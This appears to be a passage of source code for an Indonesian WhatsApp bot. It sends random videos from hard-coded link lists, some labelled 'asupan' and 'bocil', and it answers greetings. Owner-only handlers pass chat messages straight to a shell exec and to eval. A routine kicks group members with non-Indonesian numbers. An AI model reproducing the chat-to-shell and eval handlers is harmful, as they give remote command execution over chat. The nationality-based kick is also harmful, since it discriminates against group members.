    var rikagusriani = ['https://b.top4top.io/m_1930thxw90.mp4', 'https://d.top4top.io/m_1930pezhp0.mp4', 'https://c.top4top.io/m_1930cjgbx0.mp4', 'https://b.top4top.io/m_1930v6vhg0.mp4', 'https://f.top4top.io/m_1930uh7ud0.mp4', 'https://a.top4top.io/m_1930c9cpb0.mp4', 'https://k.top4top.io/m_19308amkf0.mp4', 'https://d.top4top.io/m_1930wjaq60.mp4', 'https://i.top4top.io/m_1930n2um40.mp4', 'https://i.top4top.io/m_1930e14pi0.mp4', 'https://i.top4top.io/m_1930w6lwf0.mp4', 'https://e.top4top.io/m_19307autl0.mp4', 'https://d.top4top.io/m_1930i6tfc0.mp4', 'https://c.top4top.io/m_1930qmr7u0.mp4', 'https://d.top4top.io/m_1930itbte1.mp4', 'https://i.top4top.io/m_1930ze4oq0.mp4', 'https://j.top4top.io/m_1930kkqyh1.mp4', 'https://f.top4top.io/m_1930zevlz0.mp4', 'https://g.top4top.io/m_1930q0apu1.mp4', 'https://h.top4top.io/m_1930trfsv2.mp4'];
    var random_rikagusriani = rikagusriani[Math.floor(Math.random() * (rikagusriani.length))];
    let ini_rikagusriani = await getBuffer(random_rikagusriani);
    xdev.sendMessage(from, ini_rikagusriani, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'asupan') {
    reply(mess.wait);
    var asupannih = ['http://sansekai.my.id/ptl_repost/120416207_674661289840975_7238538460676645249_n.mp4', 'http://sansekai.my.id/ptl_repost/120443017_225738842307010_1507614018538871668_n.mp4', 'http://sansekai.my.id/ptl_repost/120506710_129730895516659_9090102890235113922_n.mp4', 'http://sansekai.my.id/ptl_repost/120518115_3382156938497131_2702539154432231938_n.mp4', 'http://sansekai.my.id/ptl_repost/120533450_988960268238482_4908300175960396265_n.mp4', 'http://sansekai.my.id/ptl_repost/120554993_913582535835353_7937155730001219945_n.mp4', 'http://sansekai.my.id/ptl_repost/120565745_258483202099028_1831534734126408497_n.mp4', 'http://sansekai.my.id/ptl_repost/120570166_2716242608644571_5562452335611050430_n.mp4', 'http://sansekai.my.id/ptl_repost/120571358_3743879342322868_4731152347084614368_n.mp4', 'http://sansekai.my.id/ptl_repost/120571938_198275171805822_8506241533969509004_n.mp4', 'http://sansekai.my.id/ptl_repost/120573034_128654721967389_1837144340570017830_n.mp4', 'http://sansekai.my.id/ptl_repost/120574217_2707319792866165_3682328392840010261_n.mp4', 'http://sansekai.my.id/ptl_repost/120575986_151816433263092_6600262966520398271_n.mp4', 'http://sansekai.my.id/ptl_repost/120582400_339926344091433_2581248581156693603_n.mp4', 'http://sansekai.my.id/ptl_repost/120583739_1060190921079212_3898520254664507328_n.mp4', 'http://sansekai.my.id/ptl_repost/120587415_638776546998307_3091093882267818607_n.mp4', 'http://sansekai.my.id/ptl_repost/120589771_752670855329266_5064573607465519463_n.mp4', 'http://sansekai.my.id/ptl_repost/120613860_3393110177444352_4287165838359264124_n.mp4', 'http://sansekai.my.id/ptl_repost/120614859_768632723701773_5662521620734316774_n.mp4', 'http://sansekai.my.id/ptl_repost/120615019_149392973357031_6254963333779779708_n.mp4', 'http://sansekai.my.id/ptl_repost/120664457_338629710563119_6615226849280369453_n.mp4', 'http://sansekai.my.id/ptl_repost/120670762_191033325874671_8168246094200167609_n.mp4', 'http://sansekai.my.id/ptl_repost/120678112_971693299972883_1648826221504742220_n.mp4', 'http://sansekai.my.id/ptl_repost/120682363_1181866688854694_4233466354892721595_n.mp4', 'http://sansekai.my.id/ptl_repost/120698858_1302470566751609_3736999773452225729_n.mp4', 'http://sansekai.my.id/ptl_repost/120707049_337981777304231_3152650741169851669_n.mp4', 'http://sansekai.my.id/ptl_repost/120714412_680680702806959_2149499366562729814_n.mp4', 'http://sansekai.my.id/ptl_repost/120678112_971693299972883_1648826221504742220_n.mp4', 'http://sansekai.my.id/ptl_repost/120682363_1181866688854694_4233466354892721595_n.mp4', 'http://sansekai.my.id/ptl_repost/120698858_1302470566751609_3736999773452225729_n.mp4'];
    var random_asupannih = asupannih[Math.floor(Math.random() * (asupannih.length))];
    let ini_asupannih = await getBuffer(random_asupannih);
    xdev.sendMessage(from, ini_asupannih, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'bocil') {
    reply(mess.wait);
    var bocil = ['https://b.top4top.io/m_1931yxodg0.mp4', 'https://k.top4top.io/m_193161p380.mp4', 'https://l.top4top.io/m_1931i4g3p1.mp4', 'https://a.top4top.io/m_1931tjlio2.mp4', 'https://g.top4top.io/m_1931z2mc40.mp4', 'https://h.top4top.io/m_1931auyof1.mp4', 'https://i.top4top.io/m_19315hrle2.mp4', 'https://j.top4top.io/m_1931xul5a3.mp4', 'https://l.top4top.io/m_1931o92nr0.mp4', 'https://a.top4top.io/m_1931j1rh21.mp4', 'https://b.top4top.io/m_1931iaqpg2.mp4', 'https://c.top4top.io/m_1931s5zlj3.mp4', 'https://d.top4top.io/m_1931x0g5a4.mp4', 'https://i.top4top.io/m_1931oj76n0.mp4', 'https://j.top4top.io/m_19319gl3d1.mp4', 'https://k.top4top.io/m_1931u52cq2.mp4', 'https://l.top4top.io/m_1931mvgj73.mp4', 'https://a.top4top.io/m_1931u07oz4.mp4', 'https://j.top4top.io/m_1931h1fo60.mp4', 'https://k.top4top.io/m_1931mro3u1.mp4', 'https://l.top4top.io/m_1931kx0ac2.mp4', 'https://a.top4top.io/m_1931g9ezq3.mp4', 'https://b.top4top.io/m_1931plin14.mp4', 'https://c.top4top.io/m_1931aaxri5.mp4', 'https://d.top4top.io/m_1931ijzzn6.mp4', 'https://e.top4top.io/m_1931ugycd7.mp4', 'https://f.top4top.io/m_1931l14nk8.mp4', 'https://g.top4top.io/m_1931crgqt9.mp4'];
    var random_bocil = bocil[Math.floor(Math.random() * (bocil.length))];
    let ini_bocil = await getBuffer(random_bocil);
    xdev.sendMessage(from, ini_bocil, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'geayubi') {
    reply(mess.wait);
    var geayubi = ['https://l.top4top.io/m_1931ufrul0.mp4', 'https://a.top4top.io/m_1931jbdpk1.mp4', 'https://c.top4top.io/m_1931aj9nm2.mp4', 'https://d.top4top.io/m_1931cnsal3.mp4', 'https://e.top4top.io/m_1931d4kc74.mp4', 'https://f.top4top.io/m_1931bih8q5.mp4', 'https://g.top4top.io/m_1931xx7aa6.mp4', 'https://h.top4top.io/m_1931g3zsq7.mp4', 'https://a.top4top.io/m_1931m74wd0.mp4', 'https://b.top4top.io/m_1931p8tfm1.mp4', 'https://e.top4top.io/m_1931aj8iv0.mp4', 'https://f.top4top.io/m_1931szguy1.mp4', 'https://g.top4top.io/m_1931l73ry2.mp4', 'https://h.top4top.io/m_1931yhznj3.mp4', 'https://i.top4top.io/m_1931kmtp34.mp4', 'https://j.top4top.io/m_1931snhdg5.mp4', 'https://k.top4top.io/m_1931ay1jz6.mp4', 'https://l.top4top.io/m_1931x70mk7.mp4', 'https://a.top4top.io/m_19319mvvf8.mp4', 'https://b.top4top.io/m_1931icmzd9.mp4', 'https://h.top4top.io/m_19316oo0s0.mp4', 'https://i.top4top.io/m_1931cvvpt1.mp4'];
    var random_geayubi = geayubi[Math.floor(Math.random() * (geayubi.length))];
    let ini_geayubi = await getBuffer(random_geayubi);
    xdev.sendMessage(from, ini_geayubi, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'santuy') {
    reply(mess.wait);
    var santuy = ['https://e.top4top.io/m_1930wespy0.mp4', 'https://e.top4top.io/m_19303zfi20.mp4', 'https://j.top4top.io/m_1930t00kx0.mp4', 'https://e.top4top.io/m_1930kx7hi0.mp4', 'https://c.top4top.io/m_19307g6kd0.mp4', 'https://f.top4top.io/m_19306yk4c0.mp4', 'https://i.top4top.io/m_1930y1u780.mp4', 'https://j.top4top.io/m_1930ilsyy0.mp4', 'https://i.top4top.io/m_19301948b0.mp4', 'https://d.top4top.io/m_1930zg8460.mp4', 'https://i.top4top.io/m_19301yozl0.mp4', 'https://g.top4top.io/m_1930qjr2q0.mp4', 'https://l.top4top.io/m_1930x1wp50.mp4', 'https://a.top4top.io/m_1930zr1041.mp4', 'https://b.top4top.io/m_1930s29hq2.mp4', 'https://a.top4top.io/m_1930kbo0y0.mp4', 'https://j.top4top.io/m_1930xek9z0.mp4', 'https://i.top4top.io/m_1930s7gb80.mp4', 'https://c.top4top.io/m_1930w0dbu0.mp4', 'https://d.top4top.io/m_1930xu4kd1.mp4', 'https://a.top4top.io/m_1930zw2nb0.mp4', 'https://b.top4top.io/m_1930eybjj1.mp4', 'https://g.top4top.io/m_1930fmx330.mp4', 'https://l.top4top.io/m_1930gnlam0.mp4', 'https://g.top4top.io/m_1930twwu50.mp4', 'https://l.top4top.io/m_1930qkeh70.mp4', 'https://l.top4top.io/m_1930wefm20.mp4', 'https://a.top4top.io/m_1930idzd51.mp4'];
    var random_santuy = santuy[Math.floor(Math.random() * (santuy.length))];
    let ini_santuy = await getBuffer(random_santuy);
    xdev.sendMessage(from, ini_santuy, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'ukhty') {
    reply(mess.wait);
    var ukhty = ['https://e.top4top.io/m_1930ns2zo0.mp4', 'https://k.top4top.io/m_1930j9i810.mp4', 'https://f.top4top.io/m_1930wtj580.mp4', 'https://d.top4top.io/m_1930a2isv0.mp4', 'https://e.top4top.io/m_1930wbgc41.mp4', 'https://f.top4top.io/m_1930urbj02.mp4', 'https://b.top4top.io/m_1930ceiqv0.mp4', 'https://i.top4top.io/m_1931a0z6o0.mp4', 'https://a.top4top.io/m_193190b500.mp4', 'https://b.top4top.io/m_1931dcixz1.mp4', 'https://g.top4top.io/m_19317gpjp0.mp4', 'https://i.top4top.io/m_1931cc22w1.mp4', 'https://j.top4top.io/m_1931xn6412.mp4', 'https://g.top4top.io/m_1931silxz0.mp4', 'https://h.top4top.io/m_1931as4mg1.mp4', 'https://i.top4top.io/m_1931p9j5v0.mp4', 'https://e.top4top.io/m_1931mgeuy0.mp4', 'https://f.top4top.io/m_1931lw9381.mp4', 'https://g.top4top.io/m_1931vm0dk2.mp4', 'https://h.top4top.io/m_1931fiv8x3.mp4', 'https://b.top4top.io/m_1931jm3dt0.mp4', 'https://e.top4top.io/m_1931i7yag1.mp4', 'https://f.top4top.io/m_1931dr5ya2.mp4', 'https://g.top4top.io/m_193172kpg3.mp4', 'https://h.top4top.io/m_1931j3b224.mp4', 'https://j.top4top.io/m_19317ykt25.mp4', 'https://k.top4top.io/m_1931o0vh16.mp4', 'https://l.top4top.io/m_1931ssfbn7.mp4', 'https://a.top4top.io/m_19318t7458.mp4', 'https://b.top4top.io/m_1931vhu759.mp4'];
    var random_ukhty = ukhty[Math.floor(Math.random() * (ukhty.length))];
    let ini_ukhty = await getBuffer(random_ukhty);
    xdev.sendMessage(from, ini_ukhty, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
	

	
	//Jika ada yg kirim pesan "p" botz akan respon
				if (salam.includes(messagesC)) {
				if (isSpammerr) return 
				if (isOwner) return 
			    if(isExtream) return
				addSpammer(sender, "10s", spamkuyy)
		         if(autosticker === true) return sendSticker(ucapsalam)
				}
				
//Jika ada yg kirim pesan "Asalamualaikun" botz akan respon✓
	            if (budy.includes(`ualaikum`) || budy.includes(`u'alaikum`) ) {
            	//if (isOwner) return 
                   if (isSpammerr) return 
		          addSpammer(sender, "10s", spamkuyy)
                   if(autovn === true) return sendvn(walaikumsalam)
                  if(autosticker === true) return sendSticker1(kumsalam)
                  reply("Walaikumsalam kak")
                  }
				
//Jika ada yg kirim pesan "menu" bot akan respon
				if (menu.includes(messagesC)) {
				if (isSpammerr) return 
			    if (isOwner) return 
				reply(`Hai kak ${pushname} untuk mengakses menu ketik ${prefix}menu ya 😉`)
				addSpammer(sender, "10s", spamkuyy)
				}
				
				
//Jika ada yg toxic botz akan merespon✓
			if (!isOwner && bad.includes(messagesC)) {
				if (isSpammerr) return 
		           addSpammer(sender, "10s", spamkuyy)
                if(autovn === true) return sendvn(astaga)
				daui = fs.readFileSync('./temp/toxic/toxic.mp3')
				await xdev.sendMessage(from, daui, audio, { mimetype: 'audio/mp4', quoted: dev, ptt: true})
				await sendSticker(istigfar)
				}
				
//Jika ada yg bilang bot maka botz akan merespon✓
			 if (badud.includes(messagesC)) {
				if (isSpammerr) return
				addSpammer(sender, "10s", spamkuyy)
                if(autovn === true) return sendvn(ucapbot)
				sendMess(hayuk)
				}
				
				 

   

//Jika ada yg bilang hallo maka botz akan merespon✓
			 if (katahai.includes(messagesC)) {
			    if(isExtream) return
				if (isSpammerr) return
				addSpammer(sender, "10s", spamkuyy)
                if(autovn === true) return sendvn(moshimos)
				}
	
	//******************* 》UCAPAN《 ********************\\


//Jika ada yang bilang ohayo bot akan merespon✓
if(ohayo.includes(messagesC)){
if(isExtream) return
if (isSpammerr) return
addSpammer(sender, "10s", spamkuyy)
if (timeWib >= '11:00' && timeWib <= '23:50')  return reply("Sekarang udah ga pagi kak")
				if(autovn === true) return sendvn(oahyo)
				reply(`${ucapanWaktu} kak 🙂`)
				}
				
				
        
        
 //Jika ada yang bilang oyasumi malem bot akan merespon✓
if(katamalem.includes(messagesC)){
if(isExtream) return
if (isSpammerr) return
addSpammer(sender, "10s", spamkuyy)
if (timeWib >= '06:00' && timeWib <= '17:00')  return reply("Sekarang udah ga malem kak")
				if(autovn === true) return sendvn(oyasumi)
				reply(`${ucapanWaktu} kak 🙂`)
				}
        
        
 //Jika ada yang bilang koniciwa malem bot akan merespon✓
if(katasiang.includes(messagesC)){
if(isExtream) return
if (isSpammerr) return
addSpammer(sender, "10s", spamkuyy)
				if(autovn === true) return sendvn(koniciwa)
				reply(`${ucapanWaktu} kak 🙂`)
				}
        
        
        
 //Jika ada yang bilang lopyu bot akan merespon✓
if(katalopyou.includes(messagesC)){
if(isExtream) return
if (isSpammerr) return
addSpammer(sender, "10s", spamkuyy)
				if(autovn === true) return sendvn(lopyoutoo)
				}
        
	              if (budy.includes('ekprefix')){
		          if (isSpammerr) return
                  addSpammer(sender, "10s", spamkuyy)
                  if(multi) return xdev.sendMessage(from, `Baik kak untuk prefix saat ini adalah :「  Multi  」`, text, { quoted: ftext, contextInfo: forward })
	              xdev.sendMessage(from, `Baik kak untuk prefix saat ini adalah : 「  ${prefa}  」`, text, { quoted: ftext, contextInfo: forward })
               }
                   

                  if (!dev.key.formMe && budy.includes(nomerOwner)) {
              	if (isSpammerr) return 
		          addSpammer(sender, "10s", spamkuyy)
                  const kta =['*Bentar ya kak nanti juga di bales sama ownerku* 😉','*Tunggu aja kak, entar juga di bales* 😁','*Iya kak, ada apa tag owner aku nih* 🙂']
				  const su = kta[Math.floor(Math.random() * kta.length)]
				  xdev.sendMessage(from, su, text, { quoted: dev })
				   }
					
					//JIKA ADA YG BILANG THANKS, BOT AKAN RESPON
for (let kasih of thanks){
                  if ( budy.includes(kasih)) {
                  if(isExtream) return
                  if(dev.key.fromMe) return
                  if (isSpammerr) return 
		         addSpammer(sender, "10s", spamkuyy)
                 if(autosticker) return sendSticker(samasama)
                 reply(`Sama sama kak ${pushname}`)
                  }
                 }
	
	
	
	
	
	
	
	
	




if (selectedButton == 'INFO BOTZ') {
if(isExtream) return
                       console.log('INFO BOTZ')
                       
                       mhan = await xdev.prepareMessage(from, fs.readFileSync('./stik/bot.jpg'), image)
                       gbutsan = [{buttonId: 'DEVELOPER', buttonText: {displayText: `ᴅᴇᴠᴇʟᴏᴘᴇʀ`}, type: 1},
                                              {buttonId: 'YOUTUBE', buttonText: {displayText: `ʏᴏᴜᴛᴜʙᴇ`}, type: 1}]      
                       
 gbuttonan = {imageMessage: mhan.message.imageMessage,
                           contentText: info1.bot(gender,fake,nomerOwner),
                           footerText:`© ${fake1}`,
                           buttons: gbutsan,
                           headerType: 4
                           }
await xdev.sendMessage(from, gbuttonan, MessageType.buttonsMessage, {                         
                         contextInfo: forward})                                    
                         }
                         
                         
  if (selectedButton == 'SEWA BOTZ') {
  if(isExtream) return
                       console.log('SEWA BOTZ')                       
                       gbutsan = [{buttonId: `${prefix}owner`, buttonText: {displayText: `ᴏᴡɴᴇʀ`}, type: 1},
                                            {buttonId: `KODE QR`, buttonText: {displayText: `ᴋᴏᴅᴇ ϙʀ`}, type: 1}]      
                       
 gbuttonan = {
                           contentText: sewabot.dada(prefix, settings, pushname, ucapanWaktu) ,
                           footerText:`© ${fake1}`,
                           buttons: gbutsan,
                           headerType: 1
                           }
                         await xdev.sendMessage(from, gbuttonan, MessageType.buttonsMessage, {                         
                         quoted: ftroli, contextInfo: forward})                                 
                         }
                         
                         
        if (selectedButton == 'KODE QR') {
        if(isExtream) return
        sendButMessage(from, `KODE QR YANG TERSEDIA`, `Silahkan pilih salah satu`, [
                 {buttonId: `${prefix}gopay`, buttonText: {displayText: `ɢᴏᴘᴀʏ`,},type: 1},
                 {buttonId: `${prefix}dana`, buttonText: {displayText: `ᴅᴀɴᴀ`,},type: 1},
                  {buttonId: `${prefix}ovo`, buttonText: { displayText: `ᴏᴠᴏ`,},type: 1}]);
                    }
                   
                        
                         
        if (selectedButton == 'DEVELOPER') {
        if(isExtream) return
        sendKontak(from, "6285156137901", "DITTAZ", "Sibuk");
        if(xdev.isOnWhatsApp (Ownerin)) return reply2("Saat ini Developer sedang online")
        reply2("Developer sedang offline")
        };
                        
                         

if (selectedButton == 'YOUTUBE') {
 if(isExtream) return
console.log('YOUTUBE')
xdev.sendMessage(from, `
*YOUTUBE CHANNEL*
Kadang update kadang enggak
Support gua ya gaes dengan subs\n\nhttps://youtu.be/qxDSzDYDk44`,
text, {detectLinks: true, quoted: dev})
}

if (!multi && budy.startsWith('$')){
if (!dev.key.fromMe && !isOwner) return
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return reply(`@EXTREAM :~ ${err}`)
if (stdout) {
reply(stdout)
}
})
}
if (!multi && budy.startsWith('>')){
if (!dev.key.fromMe && !isOwner) return
try {
return xdev.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted: dev})
} catch(err) {
e = String(err)
reply(e)
}
}

if (multi === false && budy.startsWith('=>')){
if (!isOwner && !dev.key.fromMe) return
var konsol = budy.slice(3)
Return = (sul) => {
var sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined){
bang = util.format(sul)
}
return reply(bang)
}
try {
reply(util.format(eval(`;(async () => { ${konsol} })()`)))
console.log('\x1b[1;37m>', '[', '\x1b[1;32mEXEC\x1b[1;37m', ']', time, color(">", "green"), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
} catch(e){
reply(String(e))
}
}


    



			

    
        if (!dev.key.fromMe && budy.includes(`usik`)) {
        if(isOwner) return
        if(budy.includes(`untuk mengakses musik bisa ketik`)) return          
        reply(`Hai kak ${pushname} untuk mengakses musik bisa ketik ${prefix}vnlist atau ketik ${prefix}musik yah ??`)
        }


 
          if (timeWib >= '04:00' && timeWib <= '04:10') {
          console.log(color(`[${fake}]`, 'gold'), color('Bentar lagi jam 5 nih kak, Jangan lupa sholat subuh ya kak', 'cyan'))
          }
          if (timeWib >= '05:00' && timeWib <= '05:10') {
          console.log(color(`[${fake}]`, 'gold'), color('Udah sholat Subuh belum kak', 'cyan'))
          }
         if (timeWib >= '06:00' && timeWib <= '06:10') {
          console.log(color(`[${fake}]`, 'gold'), color('Pagi kak, Jangan lupa mandi', 'cyan'))
          }
          if (timeWib >= '11:00' && timeWib <= '11:10') {
          console.log(color(`[${fake}]`, 'gold'), color('Siang kak, Dah mandi blm kak?', 'cyan'))
          }
          if (timeWib >= '12:00' && timeWib <= '12:10') {
           console.log(color(`[${fake}]`, 'gold'), color('Dah jam 12 kak, Jangan lupa sholat Dzuhur ya kak', 'cyan'))
           }
          if (timeWib >= '15:00' && timeWib <= '15:10') {
          console.log(color(`[${fake}]`, 'gold'), color('Dah jam 3 kak, Jangan lupa sholat Ashar ya kak', 'cyan'))
          }
          if (timeWib >= '18:00' && timeWib <= '18:10') {
        	console.log(color(`[${fake}]`, 'gold'), color('Udah mahgrip nih kak, jangan lupa sholat ya', 'cyan'))
          }
          if (timeWib >= '19:00' && timeWib <= '19:10') {
           console.log(color(`[${fake}]`, 'gold'), color('Bentar lagi jam 8 kak, Yok kak main botnya buat nanti lagi', 'cyan'))
           }
          if (timeWib >= '20:00' && timeWib <= '20:10') {
           console.log(color(`[${fake}]`, 'gold'), color('Selamat malam kak, Jangan begadang ya kak, Tar sakit loh', 'cyan'))
           }
          if (timeWib >= '00:00' && timeWib <= '00:10') {
           console.log(color(`[${fake}]`, 'gold'), color(`${fake} ngantuk kak, tidur dulu ya kak`, 'cyan'))
           }
           
	       if (timeWib >= '08:00' && timeWib <= '08:01' ){
	       var obj = [] 
           fs.writeFileSync('./database/hitToday.json', JSON.stringify(obj))         
	       console.log(color(`[Hit Today]`, 'red'), color('Hit Today telah di reset', 'cyan'))
	      } 
                

	}	
    } catch (e) {
    e = String(e) 
    if (!e.includes("this.isZero")) {
    console.log(color('[SYSTEM] : %s', 'white'), color(e, 'green'))   
    if(e.includes("BaileysError: Not expecting a response")) return reply(`]─────「 *SYSTEM-ERROR* 」─────[\n\n${e}\nNOTE : Sinyalnya jelek kak atau bisa juga\n               pesan sementara grup masih aktif\n\n© ${fake1}`)
    if(e.includes("Error: read ECONNABORTED")) return reply(`]─────「 *SYSTEM-ERROR* 」─────[\n\n${e}\nNOTE : Yahaha pasti paket chat 🤣\n\n© ${fake1}`)
    if(e.includes("Error: ENOENT: no such file or directory, open")) return reply(`]─────「 *SYSTEM-ERROR* 」─────[\n\n${e}\nNOTE : Ada yg eror nih kak, file tidak di temukan\n              Coba extrack ulang aja\n\n© ${fake1}`)
    if(e.includes("Error: Language not supported")) return reply(`]─────「 *SYSTEM-ERROR* 」─────[\n\n${e}\nNOTE : Masukin kode bahasanya yg bener goblok\n\n© ${fake1}`)
    if(e.includes("Error: Request failed with status code")) return reply(`]─────「 *SYSTEM-ERROR* 」─────[\n\n${e}\nNOTE : Maap, sudah melebihi batas permintaan\n\n© ${fake1}`)
    if(e.includes("ECONNRESET")) return reply(`]─────「 *SYSTEM-ERROR* 」─────[\n\n${e}\nNOTE : Gada kuota mungkin\n\n© ${fake1}`)
    await reply(`]─────「 *SYSTEM-ERROR* 」─────[\n\n${e}\n\n© ${fake1}`)    
    if(checkError(e, JSON.parse(fs.readFileSync('./database/listerror.json')))) return
    addError(e, command, JSON.parse(fs.readFileSync('./database/listerror.json')))
    if(autoblockcmd){        
    addblockcmd(command,listcmdblock) 
    await reply("Command telah di block karena terjadi error")
    }
    await xdev.sendMessage(`${Ownerin}`,`*「 Laporan Bug 」*\n\nNama : ${pushname}\nNomer : ${senderNumber}\n\nInfo laporan : \n\n${e}\n\nCommand :\n${prefix}${command}\n\nQuery :\n${q}\n\n\n© ${fake1}\n${calender}\n`,text)    
    await xdev.modifyChat(`${Ownerin}`, ChatModification.delete)
    if(autoblockcmd) return
    setTimeout( () => {
	 xdev.sendMessage(from,"Laporan error telah dikirim ke developer",text)
	},2000)
    }
    } 

    


                    
      








   //ANTI ASING/BULE 
    if (isGroup && isKickarea && !dev.key.fromMe) {    
    if(isOwner) return
    if(sender.includes("+62")) return
    await reply(` *「 NOMOR ASING DETECTED 」*\nMaap kamu adalah orang asing, aku akan mengeluarkanmu`)
    await xdev.groupRemove(from, [sender]);
    await sendMess("Kick Area nih bos :v")
    }
                    
	} catch (e) {
    e = String(e)
    if (!e.includes("this.isZero")) {
    if (!e.includes("jid is not defined")) {
    console.log(color('Message : %s', 'white'), color(e, 'green'))
        }
	// console.log(e)
	}
}
}




	
    
